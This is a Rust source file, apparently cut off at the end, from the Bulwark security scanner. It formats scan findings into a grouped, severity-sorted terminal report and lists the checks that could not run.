//! The human-readable scan report: what to fix first, why in one sentence, and how — then, plainly,
//! what could not be checked. `--json` is the machine interface; this is the one people read.
//!
//! Principles, in order:
//! 1. **One line per problem.** Findings are grouped by check, so six unprotected keys are one
//!    problem "×6", not six alerts; the places are listed under `--all`.
//! 2. **Most urgent first, the rest folded.** Low and info items are summarised in one line unless
//!    `--all` is given.
//! 3. **Never falsely reassuring.** A scan with nothing to fix still says what it could not check
//!    (admin-only checks, checks that failed or couldn't run here, and what you chose to ignore). It
//!    says "nothing to fix from the checks that ran", never "all clear".

use bulwark_core::{finding_location, AiScanReport, Finding, Ignores, ScanRun, Severity};
use std::fmt::Write as _;

pub struct ReportOptions {
    /// Show low/info items and every place each problem was found.
    pub all: bool,
    /// ANSI colour (a terminal that wants it).
    pub color: bool,
    /// What was scanned, for the header ("this computer", "web-1").
    pub target: String,
    /// The terminal's width in columns. `None` when the report goes to a pipe or a file: then the
    /// layout is the fixed one ([`TEXT_WIDTH`]), so a saved report does not depend on the window
    /// it happened to be made in.
    pub columns: Option<usize>,
    /// Draw Bulwark's own symbols in ASCII (a locale that is not UTF-8).
    pub ascii: bool,
}

impl ReportOptions {
    /// The options for a report printed to this process's stdout: colour, width and symbols all
    /// follow the terminal.
    pub fn for_stdout(all: bool, target: impl Into<String>) -> Self {
        Self {
            all,
            color: Self::color_for_stdout(),
            target: target.into(),
            columns: crate::term::stdout_columns(),
            ascii: !crate::term::utf8_output(),
        }
    }

    /// Width of the text column (everything under a problem's title). On a terminal it is what
    /// fits beside the indent, never more than the fixed layout's width — long lines are no
    /// easier to read on a wide screen — and never so little that words stop fitting.
    fn text_width(&self) -> usize {
        match self.columns {
            Some(cols) => cols
                .saturating_sub(INDENT + 1)
                .clamp(MIN_TEXT_WIDTH, TEXT_WIDTH),
            None => TEXT_WIDTH,
        }
    }

    /// Colour only on a real terminal, never with `NO_COLOR` set or `TERM=dumb`.
    pub fn color_for_stdout() -> bool {
        use std::io::IsTerminal;
        std::io::stdout().is_terminal()
            && std::env::var_os("NO_COLOR").is_none()
            && std::env::var("TERM").map_or(true, |t| t != "dumb")
    }
}

struct Style {
    on: bool,
}

impl Style {
    fn wrap(&self, code: &str, s: &str) -> String {
        if self.on {
            format!("\x1b[{code}m{s}\x1b[0m")
        } else {
            s.to_string()
        }
    }
    fn bold(&self, s: &str) -> String {
        self.wrap("1", s)
    }
    fn dim(&self, s: &str) -> String {
        self.wrap("2", s)
    }
    fn green(&self, s: &str) -> String {
        self.wrap("32", s)
    }
    fn yellow(&self, s: &str) -> String {
        self.wrap("33", s)
    }
    fn severity(&self, sev: Severity, s: &str) -> String {
        let code = match sev {
            Severity::Critical => "1;31",
            Severity::High => "31",
            Severity::Medium => "33",
            Severity::Low => "34",
            Severity::Info => "2",
        };
        self.wrap(code, s)
    }
}

fn sev_word(sev: Severity) -> &'static str {
    match sev {
        Severity::Critical => "Critical",
        Severity::High => "High",
        Severity::Medium => "Medium",
        Severity::Low => "Low",
        Severity::Info => "Info",
    }
}

/// One finding, in the shape the report needs — host findings and AI-agent findings both map to it.
struct Item<'a> {
    rule_id: &'a str,
    severity: Severity,
    title: &'a str,
    explanation: &'a str,
    fix_hint: &'a str,
    /// Where it was found ("port 5432 on 0.0.0.0", "~/.claude/settings.json:12").
    place: String,
    /// A masked snippet of what was found, shown with the place under `--all`.
    evidence: Option<&'a str>,
    /// The exact path an explanation may spell out. A sentence naming it is the "what" ("key
    /// found in /home/…/notes.md"), already shown on the `in:` line, so the "why" skips it.
    raw_path: Option<&'a str>,
    /// The agent an AI finding belongs to ("Claude Code"). See [`Problem::why`].
    tool: Option<&'a str>,
}

impl<'a> From<&'a Finding> for Item<'a> {
    fn from(f: &'a Finding) -> Self {
        Item {
            rule_id: &f.rule_id,
            severity: f.severity,
            title: &f.title,
            explanation: &f.explanation,
            fix_hint: &f.fix_hint,
            place: finding_location(f),
            evidence: None,
            raw_path: None,
            tool: None,
        }
    }
}

/// One problem: a check and every place it fired.
struct Problem<'a> {
    rule_id: &'a str,
    severity: Severity,
    items: Vec<Item<'a>>,
}

impl Problem<'_> {
    /// The one-sentence "why". For a single place, the explanation's first sentence. For several,
    /// that first sentence usually names one of them ("listens … (port 9000)") and would read as if
    /// it were about all of them, so the first sentence every place shares is used instead.
    fn why(&self) -> String {
        // Each place's sentences, minus any that spell out its own path (that is the "what").
        let all: Vec<Vec<String>> = self
            .items
            .iter()
            .map(|f| {
                let all = sentences(f.explanation);
                let about_why: Vec<String> = all
                    .iter()
                    .filter(|s| f.raw_path.is_none_or(|p| !s.contains(p)))
                    .cloned()
                    .collect();
                if about_why.is_empty() {
                    all
                } else {
                    about_why
                }
            })
            .collect();
        // The same sentences with each place's own agent name blanked, so "Claude Code hooks run…"
        // and "Cursor hooks run…" count as one shared sentence, while "Port 9000 is open." and
        // "Port 5432 is open." still don't.
        let norm: Vec<Vec<String>> = self
            .items
            .iter()
            .zip(&all)
            .map(|(item, ss)| {
                ss.iter()
                    .map(|s| match item.tool.filter(|t| !t.is_empty()) {
                        Some(t) => s.replace(t, "\u{0}"),
                        None => s.clone(),
                    })
                    .collect()
            })
            .collect();
        let shared = |i: usize| norm[1..].iter().all(|o| o.contains(&norm[0][i]));
        let start = if self.items.len() == 1 {
            0
        } else {
            // No sentence every place shares: say nothing rather than describe one place under a
            // count of several. The title and the place list still say what and where.
            match (0..all[0].len()).find(|&i| shared(i)) {
                Some(i) => i,
                None => return String::new(),
            }
        };
        // A short opening sentence is usually the bare fact ("This project settings file defines
        // hooks.", "X11Forwarding is set to \"yes\"."); the sentence after it says why that matters.
        // It is added only if every place shares it, so the why never names one place.
        const SHORT: usize = 60;
        let mut why = String::new();
        for (i, sentence) in all[0].iter().enumerate().skip(start) {
            if !why.is_empty() {
                if why.chars().count() >= SHORT || !shared(i) {
                    break;
                }
                why.push(' ');
            }
            why.push_str(sentence);
        }
        why
    }

    /// The shared title. Rules that put the place in their title ("… (~/.npmrc)", "…: usb-storage")
    /// would otherwise show one place's title for all of them, so differing titles are cut back to
    /// what they have in common.
    fn title(&self) -> String {
        let first = self.items[0].title;
        if self.items.iter().all(|f| f.title == first) {
            // One place, named in the title and again on the `in:` line below it: say it once.
            if let [only] = self.items.as_slice() {
                if shows_place(only) {
                    if let Some(t) = first.strip_suffix(&format!(" ({})", only.place)) {
                        return t.to_string();
                    }
                }
            }
            return first.to_string();
        }
        let mut common = first.to_string();
        for f in &self.items[1..] {
            let n = common
                .chars()
                .zip(f.title.chars())
                .take_while(|(a, b)| a == b)
                .count();
            common = common.chars().take(n).collect();
        }
        // Never stop inside a clause that names the place: "listens on all interfaces (port" is
        // cut back to before the parenthesis, and a half-word back to the last whole one.
        if common.matches('(').count() > common.matches(')').count() {
            common.truncate(common.rfind('(').unwrap_or(0));
        }
        if let Some(c) = common.rfind(':') {
            common.truncate(c);
        }
        let differs_mid_word = self.items.iter().any(|f| {
            f.title[common.len()..]
                .chars()
                .next()
                .is_some_and(|c| c.is_alphanumeric())
        });
        if differs_mid_word {
            common.truncate(common.rfind(' ').unwrap_or(0));
        }
        // Nor on the word that led up to the place: "SSH brute-force from" (two source
        // addresses) and "Key unprotected in" are sentences with their end missing.
        let mut trimmed = common.trim_end_matches([' ', ',', '-', '—']).trim_end();
        while let Some((rest, last)) = trimmed.rsplit_once(' ') {
            if !LEAD_IN_WORDS.contains(&last.to_ascii_lowercase().as_str()) {
                break;
            }
            trimmed = rest.trim_end_matches([' ', ',', '-', '—']);
        }
        if trimmed.chars().count() >= 12 {
            return trimmed.to_string();
        }
        // Titles that differ at the start and agree at the end ("Anthropic API key exposed in AI
        // context", "Curl auth user exposed in AI context"): showing the first one for all of them
        // names a kind of key that most of the places may not hold. Name the most common kind and
        // count the others.
        self.title_by_shared_ending()
            .unwrap_or_else(|| first.to_string())
    }

    /// The fix's first step. When the places' steps differ only by each place's own name ("add
    /// 'install dccp /bin/true'", "add 'install sctp /bin/true'"), showing the first one under a
    /// count of several tells the reader to fix one of them. The name is replaced by what it is
    /// (`<module>`), which is the same instruction for every place listed below it. Steps that
    /// differ in any other way are left as the first place's, as before.
    fn fix_step(&self) -> String {
        let first = first_step(self.items[0].fix_hint);
        if self.items.iter().all(|i| first_step(i.fix_hint) == first) {
            return first;
        }
        let general: Vec<String> = self
            .items
            .iter()
            .map(|i| {
                let mut step = first_step(i.fix_hint);
                for (what, name) in place_names(&i.place) {
                    step = replace_whole_word(&step, name, &format!("<{what}>"));
                }
                step
            })
            .collect();
        if general.iter().all(|g| *g == general[0]) {
            general[0].clone()
        } else {
            first
        }
    }

    fn title_by_shared_ending(&self) -> Option<String> {
        let first = self.items[0].title;
        let mut ending: Vec<char> = first.chars().rev().collect();
        for f in &self.items[1..] {
            let n = ending
                .iter()
                .zip(f.title.chars().rev())
                .take_while(|(a, b)| **a == *b)
                .count();
            ending.truncate(n);
        }
        let ending: String = ending.into_iter().rev().collect();
        // Start at a whole word.
        let ending = &ending[ending.find(' ')?..];
        if ending.trim().chars().count() < 12 {
            return None;
        }
        let mut kinds: Vec<(&str, usize)> = Vec::new();
        for f in &self.items {
            let kind = f.title.strip_suffix(ending)?.trim();
            if kind.is_empty() {
                return None;
            }
            match kinds.iter_mut().find(|(k, _)| *k == kind) {
                Some((_, n)) => *n += 1,
                None => kinds.push((kind, 1)),
            }
        }
        // Most common first; a stable sort keeps first-seen order among equals.
        kinds.sort_by_key(|k| std::cmp::Reverse(k.1));
        let others = kinds.len() - 1;
        Some(format!(
            "{} and {others} other {}{ending}",
            kinds[0].0,
            plural(others, "kind", "kinds")
        ))
    }
}

/// Words that lead up to a place at the end of a title. See [`Problem::title`].
const LEAD_IN_WORDS: &[&str] = &[
    "from", "in", "on", "at", "to", "for", "of", "by", "with", "the", "a", "an", "is", "and",
];

/// The names in a place that tell one finding from the next, with what each is: `module=dccp` →
/// `("module", "dccp")`, a file → `("file", path)`. Places that are a port or a title have none.
fn place_names(place: &str) -> Vec<(&str, &str)> {
    let parts: Vec<(&str, &str)> = place
        .split(" · ")
        .filter_map(|part| part.split_once('='))
        .filter(|(key, value)| {
            !value.is_empty() && key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        })
        .collect();
    if !parts.is_empty() {
        return parts;
    }
    if looks_like_a_file(place) {
        return vec![("file", place)];
    }
    Vec::new()
}

/// Replaces `word` in `text` where it stands on its own — "rds" is not replaced inside "words".
fn replace_whole_word(text: &str, word: &str, with: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(at) = rest.find(word) {
        let before = rest[..at].chars().next_back();
        let after = rest[at + word.len()..].chars().next();
        let joined = |c: Option<char>| c.is_some_and(|c| c.is_alphanumeric() || c == '_');
        out.push_str(&rest[..at]);
        out.push_str(if joined(before) || joined(after) {
            word
        } else {
            with
        });
        rest = &rest[at + word.len()..];
    }
    out.push_str(rest);
    out
}

/// An explanation split into sentences, whitespace normalised. A sentence ends at `.`, `!` or `?`
/// followed by a space or the end, so "0.0.0.0" and "v1.2" stay whole.
fn sentences(text: &str) -> Vec<String> {
    let t = text.split_whitespace().collect::<Vec<_>>().join(" ");
    let mut out = Vec::new();
    let mut start = 0;
    for (i, c) in t.char_indices() {
        let end = i + c.len_utf8();
        if matches!(c, '.' | '!' | '?') && t[end..].chars().next().is_none_or(|n| n == ' ') {
            out.push(t[start..end].trim().to_string());
            start = end;
        }
    }
    if !t[start..].trim().is_empty() {
        out.push(t[start..].trim().to_string());
    }
    out
}

/// The fix's first step — enough to act on; the rest is one `--all` or one check page away.
fn first_step(fix: &str) -> String {
    let line = fix
        .lines()
        .map(str::trim)
        .find(|l| !l.is_empty())
        .unwrap_or("");
    // Strip a list marker ("1. ", "2) "), and only that: a step that starts with an address or
    // a version ("127.0.0.1 …", "0.0.0.0 means …") keeps its number.
    let digits = line.chars().take_while(char::is_ascii_digit).count();
    let rest = &line[digits..];
    match rest.strip_prefix(['.', ')']) {
        Some(after) if digits > 0 && after.starts_with(' ') => after.trim_start().to_string(),
        _ => line.to_string(),
    }
}

/// Body text column width when the report is not going to a terminal, and the most it is ever
/// given on one: with the 13-column indent, lines stay under ~92 columns.
const TEXT_WIDTH: usize = 78;
/// The indent of everything under a problem's title.
const INDENT: usize = 13;
/// The least the text column gets, however narrow the terminal: below this, words stop fitting
/// and the lines wrap at the terminal's edge anyway.
const MIN_TEXT_WIDTH: usize = 24;

/// Word-wraps to `width` columns, at most `max_lines` lines (the last ends in "…" if cut).
fn wrap(text: &str, width: usize, max_lines: usize) -> Vec<String> {
    let mut lines: Vec<String> = Vec::new();
    let mut cur = String::new();
    for word in text.split_whitespace() {
        let fits = cur.chars().count() + 1 + word.chars().count() <= width;
        if cur.is_empty() || fits {
            if !cur.is_empty() {
                cur.push(' ');
            }
            cur.push_str(word);
        } else {
            lines.push(std::mem::take(&mut cur));
            cur.push_str(word);
        }
    }
    if !cur.is_empty() {
        lines.push(cur);
    }
    if lines.len() > max_lines {
        lines.truncate(max_lines);
        let last = lines.last_mut().expect("max_lines > 0");
        // Drop whole words until the ellipsis fits, so a cut never lands mid-word ("the exac…").
        while last.chars().count() + 2 > width {
            match last.rfind(' ') {
                Some(i) => last.truncate(i),
                None => break,
            }
        }
        *last = clip(&format!("{last} …"), width);
    }
    lines.into_iter().map(|l| clip(&l, width)).collect()
}

/// Whether a single place is worth its own line: a file says where to go; anything else (a port,
/// a module, a title) is already in the title or the explanation, and "in: port 2222" under an
/// sshd_config setting points at the wrong thing.
fn looks_like_a_file(place: &str) -> bool {
    place.contains('/') || place.contains('\\')
}

/// Whether a problem found in one place gets an `in:` line. A whole-machine finding's place is
/// its own title ("SSH TCP forwarding/tunneling is enabled"), which a slash must not pass off as
/// a file.
fn shows_place(item: &Item) -> bool {
    looks_like_a_file(&item.place) && item.place != item.title
}

/// The places a problem was found, on one line that fits the text column: as many as fit (each
/// cut from the start, so the file name survives), then "+N more".
fn place_line(places: &[String], text_width: usize) -> String {
    const LABEL: usize = 4; // "in: "
    let budget = text_width - LABEL;
    if places.len() == 1 {
        return clip_place(&places[0], budget);
    }
    let mut shown: Vec<String> = Vec::new();
    for (i, place) in places.iter().enumerate() {
        let rest = places.len() - i - 1;
        let more = if rest > 0 {
            format!(", +{rest} more").len()
        } else {
            0
        };
        let used: usize = shown.iter().map(|s| s.chars().count() + 2).sum();
        let room = budget.saturating_sub(used + more);
        // The first place always gets a readable width, whatever the "+N more" costs.
        let width = if shown.is_empty() { room.max(24) } else { room }.min(48);
        let item = clip_place(place, width);
        // Keep at least one place; after that, stop rather than show a place cut to nothing.
        if !shown.is_empty() && (room < 16 || item.chars().count() > room) {
            break;
        }
        shown.push(item);
    }
    let hidden = places.len() - shown.len();
    let mut line = shown.join(", ");
    if hidden > 0 {
        line.push_str(&format!(", +{hidden} more"));
    }
    line
}

/// A place cut to `max` columns without stopping inside a word. A path keeps its end (the file
/// name is the part worth seeing); anything else — `source=/etc/crontab · command=…` — keeps its
/// start, which says what it is, and ends on a whole word.
fn clip_place(place: &str, max: usize) -> String {
    if place.chars().count() <= max {
        return place.to_string();
    }
    if looks_like_a_file(place) && !place.contains(' ') {
        return clip_start(place, max);
    }
    let cut = clip(place, max);
    let kept = cut.trim_end_matches('…');
    match kept.rfind(' ') {
        // Only when enough is left to still say something.
        Some(i) if i >= max / 2 => {
            format!("{}…", kept[..i].trim_end_matches([' ', '·', ',', '=']))
        }
        _ => cut,
    }
}

/// Like [`clip`] but keeps the end — for a path, the file name is the part worth seeing. The cut
/// lands on a folder boundary when there is one near, so the first name shown is a whole one.
fn clip_start(s: &str, max: usize) -> String {
    let n = s.chars().count();
    if n <= max {
        s.to_string()
    } else if max == 0 {
        String::new()
    } else {
        let tail: String = s.chars().skip(n - (max - 1)).collect();
        let is_sep = |c: char| c == '/' || c == '\\';
        let cut_before = s.chars().nth(n - max);
        let mid_name = !cut_before.is_some_and(is_sep) && !tail.starts_with(is_sep);
        match tail.find(is_sep) {
            // Not if that would throw most of the room away on one long name.
            Some(i) if mid_name && i <= tail.len() / 2 => format!("…{}", &tail[i..]),
            _ => format!("…{tail}"),
        }
    }
}

fn clip(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        s.to_string()
    } else if max == 0 {
        String::new()
    } else {
        let mut out: String = s.chars().take(max - 1).collect();
        out.push('…');
        out
    }
}

/// Groups items by check: worst first, then the most widespread.
fn group(items: Vec<Item<'_>>) -> Vec<Problem<'_>> {
    let mut problems: Vec<Problem> = Vec::new();
    for item in items {
        match problems.iter_mut().find(|p| p.rule_id == item.rule_id) {
            Some(p) => {
                p.severity = p.severity.max(item.severity);
                p.items.push(item);
            }
            None => problems.push(Problem {
                rule_id: item.rule_id,
                severity: item.severity,
                items: vec![item],
            }),
        }
    }
    problems.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then(b.items.len().cmp(&a.items.len()))
            .then(a.rule_id.cmp(b.rule_id))
    });
    problems
}

fn plural<'s>(n: usize, one: &'s str, many: &'s str) -> &'s str {
    if n == 1 {
        one
    } else {
        many
    }
}

/// The parts every report shares: header, the problem list, follow-up actions, and the gaps.
struct Body<'a> {
    /// After "Bulwark <version> · ": what was scanned and how much of it.
    subtitle: String,
    problems: Vec<Problem<'a>>,
    /// Shown when nothing was found ("Nothing to fix from the checks that ran.").
    /// Shown when nothing was found. `None` for a scan that couldn't analyze its input: then the
    /// empty list is no result at all, and no checkmark is drawn.
    clean: Result<&'a str, &'a str>,
    /// One-line next steps after the list (e.g. the redaction command).
    actions: Vec<String>,
    /// What this scan could not tell you.
    gaps: Vec<String>,
}

fn render_body(body: Body<'_>, opts: &ReportOptions) -> String {
    let st = Style { on: opts.color };
    let safe = crate::term_safe;
    let width = opts.text_width();
    // On a terminal, lines outside the text column are wrapped to its width too; into a pipe
    // they stay whole, so a title or a footer line can be found with one `grep`.
    let on_terminal = opts.columns.is_some();
    let mut out = String::new();
    let problems = &body.problems;
    let (main, minor): (Vec<&Problem>, Vec<&Problem>) = problems
        .iter()
        .partition(|p| opts.all || p.severity >= Severity::Medium);

    // ---- header -----------------------------------------------------------------------------
    let name = format!("Bulwark {}", env!("CARGO_PKG_VERSION"));
    let header = format!("{name} · {}", safe(&body.subtitle));
    for (i, line) in footer_lines(&header, 0, opts).iter().enumerate() {
        let _ = match line.strip_prefix(name.as_str()).filter(|_| i == 0) {
            Some(rest) => writeln!(out, "{}{}", st.bold(&name), st.dim(rest)),
            None => writeln!(out, "{}", st.dim(line)),
        };
    }
    let _ = writeln!(out);

    // ---- the list ---------------------------------------------------------------------------
    if problems.is_empty() {
        let _ = match body.clean {
            Ok(text) => writeln!(out, "{} {}", st.green("✓"), st.bold(text)),
            Err(text) => writeln!(out, "{} {}", st.yellow("!"), st.bold(text)),
        };
    } else {
        let n = problems.len();
        let mut counts = Vec::new();
        for sev in [
            Severity::Critical,
            Severity::High,
            Severity::Medium,
            Severity::Low,
            Severity::Info,
        ] {
            let c = problems.iter().filter(|p| p.severity == sev).count();
            if c > 0 {
                counts.push(st.severity(sev, &format!("{c} {}", sev_word(sev).to_lowercase())));
            }
        }
        let heading = st.bold(&format!("{n} {} to fix", plural(n, "problem", "problems")));
        let counts = counts.join(st.dim(" · ").as_str());
        // One line into a pipe; on a terminal, as many lines as its width needs.
        for line in footer_lines(&format!("{heading}  {counts}"), 0, opts) {
            let _ = writeln!(out, "{}", line.trim_end());
        }
        for p in &main {
            let times = if p.items.len() > 1 {
                st.dim(&format!("  ×{}", p.items.len()))
            } else {
                String::new()
            };
            let _ = writeln!(out);
            let pad = " ".repeat(INDENT);
            let title = safe(&p.title());
            let title_lines = if on_terminal {
                wrap(&title, width, usize::MAX)
            } else {
                vec![title]
            };
            let last = title_lines.len().saturating_sub(1);
            for (i, line) in title_lines.iter().enumerate() {
                let times = if i == last { times.as_str() } else { "" };
                let _ = if i == 0 {
                    writeln!(
                        out,
                        "  {} {} {}{}",
                        st.severity(p.severity, "●"),
                        // Padded before it is coloured: the colour codes are characters too, and
                        // padding the coloured word left the title unaligned on every terminal.
                        st.severity(p.severity, &format!("{:<8}", sev_word(p.severity))),
                        st.bold(line),
                        times
                    )
                } else {
                    writeln!(out, "{pad}{}{}", st.bold(line), times)
                };
            }
            let max_lines = if opts.all { usize::MAX } else { 2 };
            for line in wrap(&safe(&p.why()), width, max_lines) {
                let _ = writeln!(out, "{pad}{line}");
            }
            // The step is picked out of the fix while it still has its lines; only then is it
            // made safe to print as one.
            let step = safe(&p.fix_step());
            for (i, line) in wrap(&step, width - 2, max_lines).into_iter().enumerate() {
                let arrow = if i == 0 {
                    st.green("→")
                } else {
                    " ".to_string()
                };
                let _ = writeln!(out, "{pad}{arrow} {line}");
            }
            // Where it was found: every place (with what was seen there) under --all, else the
            // first few on one line. A single place is shown too, unless the title already says it.
            if opts.all {
                for item in &p.items {
                    let evidence = item.evidence.filter(|e| !e.is_empty());
                    // A finding about the machine as a whole has its title for a place, and the
                    // title is already the line above.
                    if item.place == item.title && evidence.is_none() {
                        continue;
                    }
                    let mut line = format!("· {}", safe(&item.place));
                    if let Some(ev) = evidence {
                        let _ = write!(line, "  {}", clip(&safe(ev), 60));
                    }
                    let _ = writeln!(out, "{pad}{}", st.dim(&line));
                }
            } else if p.items.len() > 1 || shows_place(&p.items[0]) {
                let places = place_line(
                    &p.items.iter().map(|i| safe(&i.place)).collect::<Vec<_>>(),
                    width,
                );
                let _ = writeln!(out, "{pad}{}", st.dim(&format!("in: {places}")));
            }
            // Built-in checks have a page with the full explanation and every fix step.
            if p.rule_id.starts_with("BLWK-") {
                let _ = writeln!(
                    out,
                    "{pad}{}",
                    st.dim(&format!(
                        "more: https://bulwark.nrl.ai/checks/{}",
                        p.rule_id.to_ascii_lowercase()
                    ))
                );
            }
        }
        if !minor.is_empty() {
            let _ = writeln!(out);
            let line = format!(
                "and {} low-priority {} — run with --all to see {}",
                minor.len(),
                plural(minor.len(), "suggestion", "suggestions"),
                plural(minor.len(), "it", "them")
            );
            for line in footer_lines(&line, 2, opts) {
                let _ = writeln!(out, "  {}", st.dim(&line));
            }
        }
    }

    if !body.actions.is_empty() {
        let _ = writeln!(out);
        for a in &body.actions {
            for (i, line) in footer_lines(a, 2, opts).iter().enumerate() {
                let mark = if i == 0 { st.green("→") } else { " ".into() };
                let _ = writeln!(out, "{mark} {line}");
            }
        }
    }

    if !body.gaps.is_empty() {
        let _ = writeln!(out);
        let _ = writeln!(out, "{}", st.dim("Not covered by this scan:"));
        for g in &body.gaps {
            for (i, line) in footer_lines(g, 4, opts).iter().enumerate() {
                let mark = if i == 0 { st.dim("·") } else { " ".into() };
                let _ = writeln!(out, "  {mark} {line}");
            }
        }
    }
    if opts.ascii {
        out = crate::term::ascii_symbols(&out);
    }
    out
}

/// A line outside the text column (a footer note, a next step), wrapped to the terminal when
/// there is one and left whole otherwise. `indent` is how far the caller indents it.
fn footer_lines(text: &str, indent: usize, opts: &ReportOptions) -> Vec<String> {
    let Some(cols) = opts.columns else {
        return vec![text.to_string()];
    };
    let width = cols.saturating_sub(indent + 1).max(MIN_TEXT_WIDTH);
    // Unlike `wrap`, a word longer than the line is never cut: these lines can carry colour
    // codes and commands to copy, and half of either is worse than a line that runs over.
    let mut lines: Vec<String> = Vec::new();
    for word in text.split(' ') {
        match lines.last_mut() {
            Some(line) if visible_width(line) + 1 + visible_width(word) <= width => {
                line.push(' ');
                line.push_str(word);
            }
            _ => lines.push(word.to_string()),
        }
    }
    lines
}

/// How many columns `s` takes on screen: its characters, without the colour codes among them.
fn visible_width(s: &str) -> usize {
    let mut width = 0;
    let mut in_code = false;
    for c in s.chars() {
        match (in_code, c) {
            (false, '\x1b') => in_code = true,
            (false, _) => width += 1,
            // A colour code ends at its letter ("\x1b[1;31m").
            (true, c) if c.is_ascii_alphabetic() => in_code = false,
            (true, _) => {}
        }
    }
    width
}

/// What failed to load, named once: the engine reports a clashing id as "rule id MY-001", which
/// under "rule … didn't load" read "rule rule id MY-001 didn't load".
fn load_error_subject(kind: &str, path: &str) -> String {
    let safe = crate::term_safe(path);
    match safe.strip_prefix("rule id ") {
        Some(id) => format!("{kind} {id}"),
        None => format!("{kind} file {safe}"),
    }
}

/// The host scan report (`bulwarkctl scan`). Pure, so it is tested without a terminal.
pub fn render(scan: &ScanRun, ignores: &Ignores, opts: &ReportOptions) -> String {
    let st = Style { on: opts.color };
    let safe = crate::term_safe;

    let ignored = scan.findings.iter().filter(|f| ignores.covers(f)).count();
    let items = scan
        .findings
        .iter()
        .filter(|f| !ignores.covers(f))
        .map(Item::from)
        .collect();

    let mut gaps: Vec<String> = Vec::new();
    // Checks whose collector needs admin rights are counted once, as checks. They used to be
    // counted twice: as "N check areas need admin rights" and again inside "M checks couldn't run
    // here", which read as M further checks being broken.
    let need_admin = scan
        .rules_needing_admin
        .iter()
        .filter(|id| !scan.rules_evaluated.contains(id) && !scan.rules_not_applicable.contains(id))
        .count();
    let n = scan.privileged_collectors_skipped.len();
    if need_admin > 0 {
        gaps.push(format!(
            "{need_admin} {} admin rights — run {}",
            plural(need_admin, "check needs", "checks need"),
            st.bold("sudo bulwarkctl scan --privileged")
        ));
    } else if n > 0 {
        // A scan result from an older engine names the areas but not the checks.
        gaps.push(format!(
            "{n} {} admin rights — run {}",
            plural(n, "check area needs", "check areas need"),
            st.bold("sudo bulwarkctl scan --privileged")
        ));
    }
    // `rules_loaded` already leaves out the rules that do not apply here (`rules_not_applicable`),
    // so they are not subtracted again: doing so hid that many undecided checks (on WSL, every
    // scan under-reported by the number of WSL-skipped rules).
    let undecided = scan
        .rules_loaded
        .saturating_sub(scan.rules_evaluated.len())
        .saturating_sub(need_admin);
    if undecided > 0 {
        gaps.push(format!(
            // No reason is guessed: a missing tool, an unreadable setting and a check this build
            // can't do on this system all land here, and a wrong reason misleads more than none.
            "{undecided} {} couldn't run here — not counted as passing",
            plural(undecided, "check", "checks")
        ));
    }
    for e in &scan.collector_errors {
        // One unreadable file is a skipped check, said in its own words; anything else is a
        // collector that failed.
        gaps.push(st.yellow(&if e.skipped {
            clip(&safe(&e.message), 200)
        } else {
            format!("{} failed: {}", e.collector, clip(&safe(&e.message), 140))
        }));
    }
    for e in &scan.rule_load_errors {
        gaps.push(st.yellow(&format!(
            "{} didn't load: {}",
            load_error_subject("rule", &e.path),
            clip(&safe(&e.message), 140)
        )));
    }
    if ignored > 0 {
        gaps.push(format!(
            "{ignored} {} you chose to ignore — {}",
            plural(ignored, "finding", "findings"),
            st.bold("bulwarkctl rules suppressions")
        ));
    }

    render_body(
        Body {
            subtitle: format!(
                "{} · {} of {} checks ran",
                opts.target,
                scan.rules_evaluated.len(),
                scan.rules_loaded
            ),
            problems: group(items),
            clean: Ok("Nothing to fix from the checks that ran."),
            actions: Vec::new(),
            gaps,
        },
        opts,
    )
}

/// A monitored machine's stored findings (`bulwarkctl hosts show`), in the same shape as a scan
/// report. `findings` are the active ones (ignores already applied by the store); `ignored` is how
/// many were hidden.
pub fn render_stored(
    findings: &[Finding],
    ignored: usize,
    subtitle: String,
    scanned: bool,
    opts: &ReportOptions,
) -> String {
    let st = Style { on: opts.color };
    let mut gaps = Vec::new();
    if ignored > 0 {
        gaps.push(format!(
            "{ignored} {} you chose to ignore — {}",
            plural(ignored, "finding", "findings"),
            st.bold("bulwarkctl hosts unignore")
        ));
    }
    render_body(
        Body {
            subtitle,
            problems: group(findings.iter().map(Item::from).collect()),
            clean: if scanned {
                Ok("Nothing to fix from its last scan.")
            } else {
                Err("Not scanned yet.")
            },
            actions: Vec::new(),
            gaps,
        },
        opts,
    )
}

/// A log scan that analyzed nothing, and why, in a sentence — `None` when it did analyze
/// something. Three cases, treated alike (no check mark, exit code 2), because "nothing found" is
/// only a result when something was looked at:
///
///   * no decoders or no rules were loaded;
///   * no log entry was read at all — an empty file, a journal that isn't there, a time range
///     with nothing in it, or only lines that weren't log entries;
///   * entries were read, and not one of them was of a kind Bulwark understands.
///
/// The second case used to print "0 events read … ✓ Nothing suspicious" and exit 0.
pub fn nothing_analyzed_reason(scan: &bulwark_core::LogScanRun) -> Option<String> {
    if scan.decoders_loaded == 0 || scan.rules_loaded == 0 {
        return Some("The log checks could not be loaded, so nothing was checked.".into());
    }
    if scan.events_read == 0 {
        return Some(
            if scan.lines_unrecognized > 0 || !scan.read_errors.is_empty() {
                "None of this input could be read as log entries, so nothing was checked."
            } else {
                "No log entries were read, so there is nothing to report on."
            }
            .into(),
        );
    }
    if scan.events_decoded == 0 {
        let n = scan.events_read as usize;
        return Some(format!(
            "{n} log {} read, but none of a kind Bulwark understands, so nothing was checked.",
            plural(n, "entry was", "entries were")
        ));
    }
    None
}

/// The log scan report (`bulwarkctl logs scan`). Each finding's place is what triggered it (the
/// source address of a brute-force burst, say) and how many events it took.
pub fn render_logs(scan: &bulwark_core::LogScanRun, opts: &ReportOptions) -> String {
    let st = Style { on: opts.color };
    let safe = crate::term_safe;
    let items = scan
        .findings
        .iter()
        .map(|f| Item {
            rule_id: &f.rule_id,
            severity: f.severity,
            title: &f.title,
            explanation: &f.explanation,
            fix_hint: &f.fix_hint,
            place: {
                let n = f.match_count;
                let events = format!("{n} {}", plural(n as usize, "event", "events"));
                if f.group_key.is_empty() {
                    format!("{events}, {}", f.observed_at.format("%Y-%m-%d %H:%M"))
                } else {
                    format!("{} ({events})", f.group_key)
                }
            },
            evidence: None,
            raw_path: None,
            tool: None,
        })
        .collect();

    // What makes an empty result untrustworthy comes first, in yellow: "nothing found" from input
    // the scanner couldn't read is not "nothing happened".
    let mut gaps: Vec<String> = scan.warnings.iter().map(|w| st.yellow(&safe(w))).collect();
    for (label, errs) in [
        ("decoder", &scan.decoder_load_errors),
